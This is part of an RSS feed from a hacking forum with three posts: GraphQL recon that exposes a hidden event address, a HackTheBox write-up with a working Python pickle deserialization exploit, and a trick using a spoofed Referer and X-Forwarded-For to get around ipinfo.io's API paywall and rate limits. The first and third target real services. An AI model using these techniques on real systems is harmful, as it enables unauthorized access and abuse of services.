<p>To wrap it up: Introspection might not work - as it didn’t for me, because it was a technique discovered in the early 60’s, so maybe a little outdated? But when testing, we have a moral obligation to give it a try. Seriously. It will take you seconds to figure whether it works or not and if does, it’s just smiles from there. Moreover, every time you blindly assume something won’t work and put it aside when it comes to infosec, a tree randomly burns into a flame. So if you truly care about saving earth, make sure to keep tabs on that. Regardless, chances are, it won’t work.</p>
<p><em>Pr0 H4x0r t1p: If you’ve got your recon done right, might be worth checking for dev / testing / staging environments as those have a better chance of having introspection enabled.</em></p>
<p>What you do then?</p>
<h2>
<a name="graphql-recon-the-contemporary-artsy-approach-5" class="anchor" href="https://0x00sec.org#graphql-recon-the-contemporary-artsy-approach-5"></a>GraphQL Recon - The contemporary / artsy approach</h2>
<p>So, introspection didn’t work and I was back to stage 1. I thought about fuzzing GraphQL endpoints, but I didn’t want to do it just yet. I wanted something easier. Everyone loves when things are easy, like when you randomly trip on something just find out there’s five bucks sitting right next to it and you can get yourself that bag of greasy doritos without feeling guilty. So I set myself to answer the following questions:</p>
<ul>
<li>How does the client gets ahold of those queries?</li>
<li>Is it being “pre-mounted” in the back-end and immediately sent out to the client when the app starts?</li>
<li>Are the queries only available when interacting with the feature place?</li>
</ul>
<p>There’s an old saying: “If you don’t see a piece of information coming from a previous request when analysing Burp’s history, it probably means it’s sitting in the client-side all along”. It’s very popular amongst prehistoric civilizations as you might have noticed based on the sentence’s structure and outdated words.</p>
<p>I had BurpSuite fired up, remember? So I went back to it and this time, armed with ancient knowledge, checked to see if they were somehow retrieving queries as you navigate through pages. When I could not find any, it became obvious: Javascript files.</p>
<p>So back to my target’s page, I opened up <strong>Chrome Developer Tools</strong> and clicked in the <strong>Console</strong> tab. Then, I fiercely typed:</p>
<pre data-code-wrap="js"><code class="lang-nohighlight">$$('script').map(script =&gt; script).filter(script =&gt; script !== '')
</code></pre>
<p>This pretty little snippet brought me back a bunch of javascript URLs. After that, I threw this list into a file, did some <em>sed-fu</em> to clean up all the unwanted characters and finally, dumped all the files while beautifying them because they were all ugly… as in, minified.</p>
<pre data-code-wrap="sh"><code class="lang-nohighlight">cat script-urls.txt | xargs -I@ sh -c "curl -s @ | js-beautify | tee -a target.js"
</code></pre>
<p>Isn’t that nice? This appends every single javascript file’s content into one big old file because I don’t necessarily care about investigating functionality separately. I knew the GraphQL queries were there somewhere amongst that spaghetti code and I just needed to get them out of there. Next, my idea was to come up with a regex pattern that could spot queries, so I went back to the ones I previously saw to make sure and I didn’t screw up the format and this is what I came up with:</p>
<pre data-code-wrap="sh"><code class="lang-nohighlight">cat target.js | grep -Eo "query\s\w+\(.*?\)"
</code></pre>
<p>Let me quickly walk you through this:</p>
<ul>
<li>Print the contents of <strong>target.js</strong>
</li>
<li>Using the following regex (<code>-E</code>), extract only (<code>-o</code>) whatever matches instead of getting the entire line</li>
<li>
<strong>Regex breakdown</strong>: search for the word <code>query</code>, follow by a space (<code>\s</code>), follow by any alphanumeric chars (<code>\w+</code>), follow by any character(s) that exists between <code>(</code> and <code>)</code>.</li>
</ul>
<p>And as a result, I got something like this:</p>
<pre><code class="lang-auto">query eventById($eventId: ID)
query userEventsById($userId: ID)
... and a bunch of other things :)
</code></pre>
<p>Now we’re talking. Maybe I should also take advantage of this hook to explain the difference between <strong>queries</strong> and <strong>mutations</strong>.</p>
<h3>
<a name="queries-and-mutations-6" class="anchor" href="https://0x00sec.org#queries-and-mutations-6"></a>Queries and Mutations</h3>
<p>You see, GraphQL sees the world through a different set of lens when drawing a comparison with REST APIs. While REST APIs rely on HTTP methods to define and specify behavior (retrieve = <code>GET</code>, insert = <code>POST</code>, update = <code>PUT</code>, etc.), GraphQL always performs HTTP <code>POST</code> requests, communicating its intention through the usage <strong>query</strong> or <strong>mutation</strong> keywords, which are reserved. The first stands for retrieving data while the latter, for inserting / modifying data.</p>
<p>Finally, the sole purpose of having APIs is to provide the ability to access / modify data while keeping it consistent when distributing it through all clients. This application being just another client which can also modify data, meant mutations could also be found throughout the javascript files:</p>
<pre data-code-wrap="sh"><code class="lang-nohighlight">cat target.js | grep -Eo "mutation\s\w+\(.*?\)"
</code></pre>
<p>Here’s what I’ve got:</p>
<pre><code class="lang-auto">mutation createEvent($input: Event!)
mutation updateEvent($input: Event!)
... truncated
</code></pre>
<p>Ultimately, you can compose the patterns together by writing:</p>
<pre data-code-wrap="sh"><code class="lang-nohighlight">cat target.js | grep -Eo '(query|mutation)\s\w+\(.*?\)\s{.*?\"'
</code></pre>
<p>which this time, yielded something like this:</p>
<pre><code class="lang-auto">query eventById($eventId: ID) { event(id: $eventId) { ...EventById } } "
</code></pre>
<p>Attention-oriented fellows might have spotted a subtle difference between the pattern above and the ones before that. The reason is that I have expanded it to capture the entire queries / mutations instead of just signatures. I did this because I wanted to easily navigate through the app’s functionalities while still being able to analyse queries separately when needed. This helps to summarize the features and gives me a direction to where / what to look for.</p>
<p>And speaking of entire queries: Have you noticed some of the expected arguments are like <code>$variable: Something</code> or sometimes a query has something like <code>{ ...Something }</code>. That <strong>Something</strong> is the expected type (e.g. Int, String, complex types, etc.) and the exclamation point (<code>!</code>) means its mandatory. For strings, in order to fix the query you can basically throw something between quotes and call it a day. Even if the value you passed is wrong, query will still work given the type is correct. Same for numbers. But when it comes to complex types, it is harder to infer what is expecting (introspection would specially come handy here, but life ain’t easy, am I right?). Which brings us to last worth covering topic I want to discuss here.</p>
<h3>
<a name="fragments-7" class="anchor" href="https://0x00sec.org#fragments-7"></a>Fragments</h3>
<p>Again, what if you didn’t actually have to guess anything? <strong>Fragments</strong> are a subset of the fields associated with their existing type. Confusing? Maybe. But let’s together, check this snippet which is gonna make things as clear as day:</p>
<pre data-code-wrap="graphql"><code class="lang-nohighlight">fragment EventAdress on Event {
  location
  number
  city
}
</code></pre>
<p>Fragments encourage reusability (is that word?), so when you see something like <code>{ ...EventAddress }</code> as part of one query, it’s actually being converted into <code>{ location number city }</code>. Why’s that important? Well, you can also search for fragments and extract more information about each node and their respective fields. As always, here’s a slick <em>oneliner</em> to get you up to speed:</p>
<pre><code class="lang-bash">cat *.js | grep -Eo '(fragment)\s\w+\s\w+\s\w+\s\{.*?\"'
</code></pre>
<p>which gets us:</p>
<pre><code class="lang-auto">fragment EventAdditionalInfo on Event {\n    id\n  baseUrl\n  }\n"
... truncated
</code></pre>
<p>Pheeeew. That’s a whole lot of things. Some of you might be wondering if it was worth putting this much effort instead of creating the stupid account. You are right, it probably wasn’t, which maybe now got you to think about your own life and how it isn’t that bad after all, which lastly, somehow ties everything together since the whole secret point of this article is to be read as a meme.</p>
<h2>
<a name="wait-what-were-we-talking-about-again-8" class="anchor" href="https://0x00sec.org#wait-what-were-we-talking-about-again-8"></a>Wait, what were we talking about again?</h2>
<p>So, all this information, countless hours of restless research (it was actually barely 5 hours with my ADHD hyperfocus on its best)… for what? To get an address for an event I was already considering bailing because of all the hassle I had to go through. But let’s wrap it up so we can all go home with something new to talk about when starting off conversations with strangers in random bars.</p>
<p>Here’s the thing: If you made this far (I thank you advance for that), I’m sure you’ve already put 2 + 2 together and already has some ideas of what you can do with this. But maybe a couple of ideas if I may?</p>
<h2>
<a name="couple-of-ideas-9" class="anchor" href="https://0x00sec.org#couple-of-ideas-9"></a>Couple of ideas</h2>
<h3>
<a name="expanding-queries-10" class="anchor" href="https://0x00sec.org#expanding-queries-10"></a>Expanding queries</h3>
<p>As in my case as you might recall, I only cared about that <strong>address</strong> bit. I found the query I wanted and noticed that when the user was logged, it would add an additional field called <code>eventAddress</code>, which didn’t show up when you just hit the event’s page without having an account. Simple as that. As their API would still respond regardless, I just added the additional field to the query, replayed the request and voila. The lack of authentication didn’t prevent the additional field being added to the query. It was omitted when the application was performing the request for us, so I guess security through obscurity as they say.</p>
<p>And that was it, I was as in… (not really, because there was an additional field saying <code>confirmedAttendance</code> which was set to <code>false</code>), but you get the point.</p>
<h3>
<a name="proxy-all-queries-to-map-out-the-applications-features-11" class="anchor" href="https://0x00sec.org#proxy-all-queries-to-map-out-the-applications-features-11"></a>Proxy all queries to map out the application’s features</h3>
<p>Another thing I thought was, we could moved all the queries into a wordlist kinda of structure, and run a script against it, requesting everything while proxying it (maybe you can also do it with Burp Intruder, up to you).</p>
<p>One caveat is that if you immediately forward the requests, you will see some of the queries (the ones with arguments) will fail and that’s expected, since we got those queries through static analysis and providing right arguments is the application’s job, happening at runtime. You can still play around with the queries as you go. Moreover, now you have access to everything the application needs to communicate with the GraphQL server.</p>
<h3>
<a name="fuzzing-12" class="anchor" href="https://0x00sec.org#fuzzing-12"></a>Fuzzing</h3>
<p>I said earlier I didn’t want to try fuzzing right at the beginning but there’s definitely value in doing this once you know how the queries are structured along with their naming conventions. This can save you a lot of time. Maybe there was some endpoint that isn’t there but your chances of finding out had now increase as you have a bit more understanding of their internals.</p>
<h2>
<a name="wrapping-up-13" class="anchor" href="https://0x00sec.org#wrapping-up-13"></a>Wrapping up</h2>
<p>You may be wondering how that event turned out in the end. Was it worth it? So funny thing: a friend of mine ended up setting up an account and added me as a +1, but I decided to take a nap before going and turns out it 6 hours don’t fall into the nap category, so I missed it. I guess my conclusion is: The journey matters more than the outcome? I don’t know. Bye.</p>
<h2>
<a name="additional-resources-14" class="anchor" href="https://0x00sec.org#additional-resources-14"></a>Additional resources</h2>
<ul>
<li><a href="https://graphql.org/learn/" rel="noopener nofollow ugc">GraphQL documentation</a></li>
<li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql" rel="noopener nofollow ugc">Pentest GraphQL - Hacktricks</a></li>
<li><a href="https://www.whiteoaksecurity.com/blog/graphql-batching-attacks-turbo-intruder/" rel="noopener nofollow ugc">GraphQL batching attacks turbo intruder</a></li>
</ul>
            <p><small>5 posts - 4 participants</small></p>
            <p><a href="https://0x00sec.org/t/a-graphql-tale-what-else-is-in-there-besides-introspection/31180">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/a-graphql-tale-what-else-is-in-there-besides-introspection/31180</link>
          <pubDate>Mon, 12 Sep 2022 10:49:37 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-31180</guid>
          <source url="https://0x00sec.org/t/a-graphql-tale-what-else-is-in-there-besides-introspection/31180.rss">A GraphQL tale: What else is in there besides introspection?</source>
        </item>
        <item>
          <title>Pickle Insecure Deserialization | HackTheBox baby website rick</title>
          <dc:creator><![CDATA[0xbro]]></dc:creator>
          <category>Web Hacking</category>
          <description><![CDATA[
            <h1><a name="pickle-insecure-deserialization-hackthebox-baby-website-rick-1" class="anchor" href="https://0x00sec.org#pickle-insecure-deserialization-hackthebox-baby-website-rick-1"></a>Pickle Insecure Deserialization | HackTheBox baby website rick</h1>
<p>Learn and understand how serialization and deserialization works and how to exploit Insecure Deserialization vulnerabilities when using the unsafe python module “pickle” attacking the HackTheBox web challenge “baby website rick”</p>
<h3><a name="improved-skills-2" class="anchor" href="https://0x00sec.org#improved-skills-2"></a>Improved skills</h3>
<ul>
<li>How <strong>serialization</strong> and <strong>deserialization</strong> work</li>
<li>How to exploit <strong>insecure deserialization vulnerabilities</strong> when using <strong>python pickle</strong> .</li>
</ul>
<h2><a name="video-3" class="anchor" href="https://0x00sec.org#video-3"></a>Video</h2>
<p><a href="https://www.youtube.com/watch?v=TPAhM6W2Zaw">Pickle Insecure Deserialization | baby website rick @ HackTheBox</a></p>

<h2><a name="writeup-tldr-4" class="anchor" href="https://0x00sec.org#writeup-tldr-4"></a>Writeup [TL;DR]</h2>
<blockquote>
<p>Look Morty, look! I turned myself into a website Morty, I’m Website Rick babyyy!! But don’t play around with some of them anti pickle serum I have stored somewhere safe, if I turn back to a human I’ll have to go to family therapy and we don’t want that Morty.</p>
</blockquote>
<h2><a name="information-gathering-5" class="anchor" href="https://0x00sec.org#information-gathering-5"></a>Information Gathering</h2>
<p>Running the instance of the challenge it is possible to browse to the Website Rick home page, where it is possible to read:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/a/6/a6a0e5c47f52d2bd3e350711f717baa5b7b8fbad.png" data-download-href="/uploads/short-url/nM3YQJPbZEsJRfZNapjOKiYLwaV.png?dl=1" title="baby website rick 1" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/a/6/a6a0e5c47f52d2bd3e350711f717baa5b7b8fbad_2_690x326.png" alt="baby website rick 1" data-base62-sha1="nM3YQJPbZEsJRfZNapjOKiYLwaV" width="690" height="326" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/a/6/a6a0e5c47f52d2bd3e350711f717baa5b7b8fbad_2_690x326.png, https://0x00sec.s3.amazonaws.com/optimized/3X/a/6/a6a0e5c47f52d2bd3e350711f717baa5b7b8fbad_2_1035x489.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/a/6/a6a0e5c47f52d2bd3e350711f717baa5b7b8fbad_2_1380x652.png 2x" data-dominant-color="BDB7AC"></a></div><br>
Don’t play around with this serum morty!! and then the info <code>&lt;__main__.anti_pickle_serum object at 0x7f88f526cf90&gt;</code><p></p>
<p>As also suggested by the title of the page, this challenge focuses on an insecure deserialization vulnerability.</p>
<p>Intercepting with Burpsuite the request sent to the server, it is possible to notice that the client sends a strange cookie, called plan_b. Decoding the cookie I can read some weird instruction like <code>__main__</code> or <code>__builtin__</code> object that suggest me something related to python, as also confirmed by the Server fingerprint.<br>
</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/2/f/2ffc6a4bc94eccc56ec25eadb552198d4c8083ee.png" data-download-href="/uploads/short-url/6QveLJkhk9b4LvV0WhiWtHlVsgS.png?dl=1" title="baby website rick 2" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/2/f/2ffc6a4bc94eccc56ec25eadb552198d4c8083ee_2_690x462.png" alt="baby website rick 2" data-base62-sha1="6QveLJkhk9b4LvV0WhiWtHlVsgS" width="690" height="462" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/2/f/2ffc6a4bc94eccc56ec25eadb552198d4c8083ee_2_690x462.png, https://0x00sec.s3.amazonaws.com/original/3X/2/f/2ffc6a4bc94eccc56ec25eadb552198d4c8083ee.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/2/f/2ffc6a4bc94eccc56ec25eadb552198d4c8083ee.png 2x" data-dominant-color="EDEBEB"></a></div><p></p>
<p>At the moment I can already assume that playing around with the cookie probably will lead to some kind of code execution or file inclusion, however I don’t know yet in what way.</p>
<p>Because the word “pickle” appears multiple times, I started documenting about what it is, discovering that pickle is a Python module used to serialize and deserialize objects. As also said within the official documentation, pickle is not secure. It is possible to construct malicious pickle data which will execute arbitrary code during unpickling. Ok, so plan_b is a cookie used to pass pickled serialized data to the server.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/8/9/894285bc8899b9602bba108c88f4d006be8fd767.png" data-download-href="/uploads/short-url/jAfW624wVCGxmUrmz0z8gNRG4qH.png?dl=1" title="baby website rick 3" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/8/9/894285bc8899b9602bba108c88f4d006be8fd767.png" alt="baby website rick 3" data-base62-sha1="jAfW624wVCGxmUrmz0z8gNRG4qH" width="690" height="479" data-dominant-color="EEE7E8"></a></div><p></p>
<p>From what I just read from the documentation it is possible to send a malicious cookie in order to force the server to deserialize it and execute arbitrary code. But in which way?</p>
<p>The documentation shows different methods that can be used to manage pickle data, as well as another module, called pickletools, that can be used to disassemble pickled object. In order to better understand what is passed to the server, I wrote a small python script that decompile and optimize the plan_b cookie. The decompiled pickle is not very helpful, however it allows to understand that the server is expecting an <code>anti_pickle_serum</code> class object (as also suggested by the home page).</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/1/a/1ad1df98517427d5769b57b7df72c34df087577c.png" data-download-href="/uploads/short-url/3Pg45x7GFnroPRyq3kERn4G48FK.png?dl=1" title="baby website rick 4" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/1/a/1ad1df98517427d5769b57b7df72c34df087577c_2_690x322.png" alt="baby website rick 4" data-base62-sha1="3Pg45x7GFnroPRyq3kERn4G48FK" width="690" height="322" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/1/a/1ad1df98517427d5769b57b7df72c34df087577c_2_690x322.png, https://0x00sec.s3.amazonaws.com/optimized/3X/1/a/1ad1df98517427d5769b57b7df72c34df087577c_2_1035x483.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/1/a/1ad1df98517427d5769b57b7df72c34df087577c_2_1380x644.png 2x" data-dominant-color="30353D"></a></div><p></p>
<p>Ok, I’ve no idea on what to do next, so let’s search online for any good article explaining this pickle vulnerability. One of the first results is this blog post from David’s personal site <a href="https://davidhamann.de/2020/04/05/exploiting-python-pickle/" rel="noopener nofollow ugc">^1</a> where it explains how to exploit a pickle deserialization vulnerability using the <strong>reduce</strong>() function.</p>
<p>The <code>__reduce__()</code> method takes no argument and shall return either a string or a tuple. The semantics of each item are in order:</p>
<p>A callable object that will be called to create the initial version of the object.</p>
<p>A tuple of arguments for the callable object. An empty tuple must be given if the callable does not accept any argument.</p>
<p>So by implementing <code>__reduce__()</code> in a class, I can give the pickling process a callable and some other arguments to run. Potentially I can execute os.system() and some commands, as also shown by the David’s PoC.</p>
<p>Based on its code I wrote a test exploit which implement the <code>__reduce__()</code> method and execute <code>ls</code>. I gave to the class the same name used by the original pickle and I generated the serialized string. Mmm… Looking at the decompiled code it seems too different from the previous one, however let’s see if the exploit work. Let me copy the string and paste it within the plan_b cookie. Crap, Internal Server Error. Probably the two objects differs too much.</p>
<p>After some trial and error I figured out how to generate almost the same serialized object. The script simply defines a void constructor and then generates the corresponding pickle. The two however are still different.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/9/f/9fb6136b14f4349009c7e502ec7c7cdb758e16e3.png" data-download-href="/uploads/short-url/mMS0PXp4eZ0roGqTn4M5YEiEocX.png?dl=1" title="baby website rick 5" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/9/f/9fb6136b14f4349009c7e502ec7c7cdb758e16e3_2_690x311.png" alt="baby website rick 5" data-base62-sha1="mMS0PXp4eZ0roGqTn4M5YEiEocX" width="690" height="311" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/9/f/9fb6136b14f4349009c7e502ec7c7cdb758e16e3_2_690x311.png, https://0x00sec.s3.amazonaws.com/optimized/3X/9/f/9fb6136b14f4349009c7e502ec7c7cdb758e16e3_2_1035x466.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/9/f/9fb6136b14f4349009c7e502ec7c7cdb758e16e3_2_1380x622.png 2x" data-dominant-color="30353D"></a></div><p></p>
<h2><a name="exploitation-6" class="anchor" href="https://0x00sec.org#exploitation-6"></a>Exploitation</h2>
<p>Looking at the meaning of the decompiled <code>SETITEM</code> opcode I found out that it add a pair of Key-Value to an existing dictionary, meaning that my custom object must be pickled inside a dictionary in order to be equal the original one. Good! The two object are now the same, I have successfully reversed the original pickle and I’m able to generate valid serialized objects. Let’s try to implement the <code>__reduce__()</code> method within this class and see if it works now that the result is the same of the original.</p>
<p>It works! Although it didn’t show the result of the executed command, the server did not throw an Internal Server Error, instead it printed a “0” which is the value returned by the command.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/8/0/80146c455e8728e43d4d922aa6652241fe51be0a.png" data-download-href="/uploads/short-url/ih2S4xVwGSEs35YHbJNClcWowsy.png?dl=1" title="baby website rick 6" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/8/0/80146c455e8728e43d4d922aa6652241fe51be0a.png" alt="baby website rick 6" data-base62-sha1="ih2S4xVwGSEs35YHbJNClcWowsy" width="564" height="500" data-dominant-color="F6F4F5"></a></div><p></p>
<p>As said by an user on StackExchange “<code>os.system()</code> just run the process, it doesn’t capture the output”. In order to obtain the output of the command it is necessary to use a different function, like <code>subprocess.check_output()</code></p>
<p>Ok, let’s implement the new function.</p>
<p>Damn, it is better if I re-read the documentation… Right, I must return a tuple containing the function to call and a tuple of arguments. Maybe we are done.</p>
<pre><code class="lang-python">#!/usr/bin/env python
import pickle
import pickletools
import base64
import os
import subprocess

class anti_pickle_serum(object):
	def __reduce__(self):
		cmd = ['ls']
		#return os.system, (cmd,)
		return subprocess.check_output, (cmd,)

exploit_obj = anti_pickle_serum()
raw_pickle = pickle.dumps({"serum" : exploit_obj}, protocol=0)

optimed_pickle = pickletools.optimize(raw_pickle)
pickletools.dis(optimed_pickle)

payload = base64.b64encode(raw_pickle)
#print "Payload: "+payload
print(payload)
</code></pre>
<p>&lt;500 INTERNAL SERVER ERROR&gt;</p>
<p>Wait, this should be correct! Maybe python3 and python2 behave differently when generating the serialized object? The server uses python2 so let’s try with that version.</p>
<p>Here we go! I have successfully executed the <code>ls</code> command. Now let’s update the script and obtain the flag!</p>
<pre><code class="lang-auto">#!/usr/bin/env python
import pickle
import pickletools
import base64
import os
import subprocess

class anti_pickle_serum(object):
	def __reduce__(self):
		cmd = ['cat', 'flag_wIp1b']
		return subprocess.check_output, (cmd,)

exploit_obj = anti_pickle_serum()
raw_pickle = pickle.dumps({"serum" : exploit_obj}, protocol=0)

optimed_pickle = pickletools.optimize(raw_pickle)
pickletools.dis(optimed_pickle)

payload = base64.b64encode(raw_pickle)
print(payload)
</code></pre>
            <p><small>3 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/pickle-insecure-deserialization-hackthebox-baby-website-rick/27130">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/pickle-insecure-deserialization-hackthebox-baby-website-rick/27130</link>
          <pubDate>Thu, 16 Sep 2021 16:44:14 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-27130</guid>
          <source url="https://0x00sec.org/t/pickle-insecure-deserialization-hackthebox-baby-website-rick/27130.rss">Pickle Insecure Deserialization | HackTheBox baby website rick</source>
        </item>
        <item>
          <title>Bypassing the IPinfo API (feat. pry0cc)</title>
          <dc:creator><![CDATA[vict0ni]]></dc:creator>
          <category>Web Hacking</category>
          <description><![CDATA[
            <p>Around October 2020, I was pretty active in the bug hunting community. And of course, I was hunting too, as a form of training and learning process. Around that time, my friend <a href="https://twitter.com/pry0cc">@pry0cc</a> made a utility named <a href="https://github.com/pry0cc/ipi">ipi</a></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/7/e/7ea3943b939d0acdf846c69e62499558d14f3c98.png" data-download-href="/uploads/short-url/i4iCV2c1ws1Z16bvyENLxBgMvHi.png?dl=1" title="ipi README"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/7/e/7ea3943b939d0acdf846c69e62499558d14f3c98_2_690x82.png" alt="ipi README" data-base62-sha1="i4iCV2c1ws1Z16bvyENLxBgMvHi" width="690" height="82" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/7/e/7ea3943b939d0acdf846c69e62499558d14f3c98_2_690x82.png, https://0x00sec.s3.amazonaws.com/original/3X/7/e/7ea3943b939d0acdf846c69e62499558d14f3c98.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/7/e/7ea3943b939d0acdf846c69e62499558d14f3c98.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/7/e/7ea3943b939d0acdf846c69e62499558d14f3c98_2_10x10.png"></a></div><p></p>
<p>As explained in the README file, this utility was based on the <a href="http://ipinfo.io">ipinfo.io</a> API. IPinfo is a company providing trusted ASN and IP address data. Its usage is pretty simple: you purchase a subscription and then you use the API, along with the token they provide you when you subscribe.</p>
<pre><code class="lang-bash"># Taken from https://ipinfo.io/developers:

# With Basic Auth
$ curl -u $TOKEN: ipinfo.io

# With Bearer token
$ curl -H "Authorization: Bearer $TOKEN" ipinfo.io

# With token query parameter
$ curl ipinfo.io?token=$TOKEN

# E.g. $ curl ipinfo.io/8.8.8.8?token=$TOKEN
</code></pre>
<p>There’s also a widget on their website for everyone to test out the API.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/8/6/864a1fbb972fb50bcf1368a48dca1970670850a3.png" data-download-href="/uploads/short-url/j9YN29KWqA98miABctttcSiC7jZ.png?dl=1" title="widget"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/8/6/864a1fbb972fb50bcf1368a48dca1970670850a3_2_690x311.png" alt="widget" data-base62-sha1="j9YN29KWqA98miABctttcSiC7jZ" width="690" height="311" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/8/6/864a1fbb972fb50bcf1368a48dca1970670850a3_2_690x311.png, https://0x00sec.s3.amazonaws.com/optimized/3X/8/6/864a1fbb972fb50bcf1368a48dca1970670850a3_2_1035x466.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/8/6/864a1fbb972fb50bcf1368a48dca1970670850a3.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/8/6/864a1fbb972fb50bcf1368a48dca1970670850a3_2_10x10.png"></a></div><p></p>
<p>This is the part where I thought: if the widget is not secure enough, then that’s free IPinfo API, right? Well, after tweaking it, there were two problems with that:</p>
<ol>
<li>There had to be a way to make a request to access the widget from the terminal</li>
<li>The widget was heavily rate-limited</li>
</ol>
<p>Resolving the first issue was quite easy. All I had to do is to see how the request was made to the widget, so I can move it to my terminal.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/9/a/9a4a181ffcf4ed1355ad996604dfb56f76601e33.png" data-download-href="/uploads/short-url/m0Uh9kNSXP3WfcCOGZLMEgKb32z.png?dl=1" title="request"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/9/a/9a4a181ffcf4ed1355ad996604dfb56f76601e33_2_690x325.png" alt="request" data-base62-sha1="m0Uh9kNSXP3WfcCOGZLMEgKb32z" width="690" height="325" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/9/a/9a4a181ffcf4ed1355ad996604dfb56f76601e33_2_690x325.png, https://0x00sec.s3.amazonaws.com/optimized/3X/9/a/9a4a181ffcf4ed1355ad996604dfb56f76601e33_2_1035x487.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/9/a/9a4a181ffcf4ed1355ad996604dfb56f76601e33_2_1380x650.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/9/a/9a4a181ffcf4ed1355ad996604dfb56f76601e33_2_10x10.png"></a></div><p></p>
<p>Apparently, there is a <code>/widget/[IP]</code> endpoint, where anyone can make a request and get the IP data. Moving this from the browser to the terminal wasn’t successful at the beginning</p>
<pre><code class="lang-bash">op@ghost:~$ curl https://ipinfo.io/widget/8.8.8.8
Not Foundop@ghost:~$
</code></pre>
<p>Of course, since the widget is hosted on their website, it should only listen to requests originating from them. One way to do this is by adding the Referer header. That way, the request “says” to the server “hey, I’m making this request by using your website, so I’m totally legal”</p>
<pre><code class="lang-bash">op@ghost:~$ curl -H "Referer: https://ipinfo.io/" https://ipinfo.io/widget/8.8.8.8
{
  "ip": "8.8.8.8",
  "hostname": "dns.google",
  "anycast": true,
  "city": "Mountain View",
  "region": "California",
  ...
  ...
</code></pre>
<p>Well, there you have it, the first part’s done. But the second problem still existed: the rate-limiting mechanism was allowing 10 requests per user. By that time I had already mentioned that to pry to check this out since he’s been using the API. After around 10 (maybe 15?) seconds he came up with an idea about the rate-limiting problem: using the <code>X-Forwarded-For</code> header.</p>
<p>Acourding to <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For">developer.mozilla.org</a></p>
<blockquote>
<p>The X-Forwarded-For (XFF) header is a de-facto standard header for identifying the originating IP address of a client connecting to a web server through an HTTP proxy or a load balancer.</p>
</blockquote>
<p>You see, when a server is using a reverse proxy or a load balancer, the user’s IP address is contained in the <code>X-Forwarded-For</code> header and passed from the proxy to the main server. If that’s the case for IPinfo’s server, there might be a chance for the <code>X-Forwarded-For</code> header value to be overwritten by our value. Changing the header value on every request would look to the server as each request is made each time from a different user/IP. And that worked!</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/0/c/0c13530f2f8d0eb6e006c7c2e2fd818c00676726.png" data-download-href="/uploads/short-url/1IP8bKDOnFrq5VOr0IttduqRtYO.png?dl=1" title="BRUH"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/0/c/0c13530f2f8d0eb6e006c7c2e2fd818c00676726_2_690x195.png" alt="BRUH" data-base62-sha1="1IP8bKDOnFrq5VOr0IttduqRtYO" width="690" height="195" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/0/c/0c13530f2f8d0eb6e006c7c2e2fd818c00676726_2_690x195.png, https://0x00sec.s3.amazonaws.com/original/3X/0/c/0c13530f2f8d0eb6e006c7c2e2fd818c00676726.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/0/c/0c13530f2f8d0eb6e006c7c2e2fd818c00676726.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/0/c/0c13530f2f8d0eb6e006c7c2e2fd818c00676726_2_10x10.png"></a></div><p></p>
